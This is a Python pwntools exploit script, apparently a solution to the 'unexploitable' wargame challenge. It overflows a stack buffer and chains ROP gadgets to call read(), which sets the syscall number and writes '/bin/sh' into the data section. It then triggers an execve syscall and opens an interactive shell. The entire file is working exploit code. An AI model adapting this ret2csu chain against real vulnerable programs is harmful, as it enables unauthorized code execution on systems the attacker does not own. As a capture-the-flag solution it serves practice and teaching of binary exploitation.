import time

from pwn import *


class UnexploitableExploit(object):

    READ_SIZE = 0x50F
    BYTES_UNTIL_STACK_OVERFLOW = 24
    EXECVE_SYSCALL_NUMBER = 0x3B

    DATA_START_ADDRESS = 0x601018

    READ_FUNCTION_ADDRESS = 0x601000
    SYSCALL_GADGET = 0x400560
    PREPARE_REGISTERS_GADGET = 0x4005E6
    MOV_REGISTERS_AND_CALL_FUNCTION_GADGET = 0x4005D0

    def __init__(self):
        self.shell = process(executable="/home/unexploitable/unexploitable", argv=["/home/unexploitable/unexploitable"])
        self.rop_chain_payload = b""
        self.additional_input_payload = b""

    def prepare_registers_and_call_function(self, rbx, rbp, function_addr, edi, rsi, rdx):
        # mov r12, [rsp+0x18]; mov r13, [rsp+0x20]; mov r14, [rsp+0x28]; mov r15, [rsp+0x30]; add rsp, 0x38; ret
        self.rop_chain_payload += p64(self.PREPARE_REGISTERS_GADGET)
        self.rop_chain_payload += b"A" * 8  # Dummy
        self.rop_chain_payload += p64(rbx)
        self.rop_chain_payload += p64(rbp)
        self.rop_chain_payload += p64(function_addr)  # r12
        self.rop_chain_payload += p64(edi)  # r13
        self.rop_chain_payload += p64(rsi)  # r14
        self.rop_chain_payload += p64(rdx)  # r15

        # xor ebx, ebx; nop dword ptr [rax+0x00]; mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
        self.rop_chain_payload += p64(self.MOV_REGISTERS_AND_CALL_FUNCTION_GADGET)
        # After the call gadget the code will continue to PREPARE_REGISTERS_GADGET, so we add padding to the stack
        self.rop_chain_payload += p64(0) * 7

    def activate_rop_chain(self):
        self.rop_chain_payload += b"A" * self.BYTES_UNTIL_STACK_OVERFLOW

        # Prepare registers and call read(fd, buf, nbytes)
        # where fd=0(stdin), buf=DATA_START_ADDRESS, nbytes=EXECVE_SYSCALL_NUMBER(0x3B)
        # rbx and rbp values are important in order to return to the ROP chain after the call instruction
        self.prepare_registers_and_call_function(rbx=0, rbp=1, function_addr=self.READ_FUNCTION_ADDRESS,
                                                 edi=0, rdx=self.EXECVE_SYSCALL_NUMBER, rsi=self.DATA_START_ADDRESS)

        # Activate execve syscall with edi->"/bin/sh", rdx->NULL, rsi->NULL
        bin_sh_addr = self.DATA_START_ADDRESS
        syscall_gadget_pointer_addr = self.DATA_START_ADDRESS + 8
        null_pointer_addr = self.DATA_START_ADDRESS + 16
        self.additional_input_payload = b"/bin/sh\x00" + p64(self.SYSCALL_GADGET) + p64(0)
        self.additional_input_payload = self.additional_input_payload.ljust(self.EXECVE_SYSCALL_NUMBER, b"\x00")
        self.prepare_registers_and_call_function(rbx=0, rbp=0, function_addr=syscall_gadget_pointer_addr,
                                                 edi=bin_sh_addr, rdx=null_pointer_addr, rsi=null_pointer_addr)

        self.rop_chain_payload = self.rop_chain_payload.ljust(self.READ_SIZE, b"\x00")

        self.shell.send(self.rop_chain_payload)

    def run(self):
        self.activate_rop_chain()
        time.sleep(2)
        self.shell.send(self.additional_input_payload)
        self.shell.interactive()


if __name__ == '__main__':
    UnexploitableExploit().run()
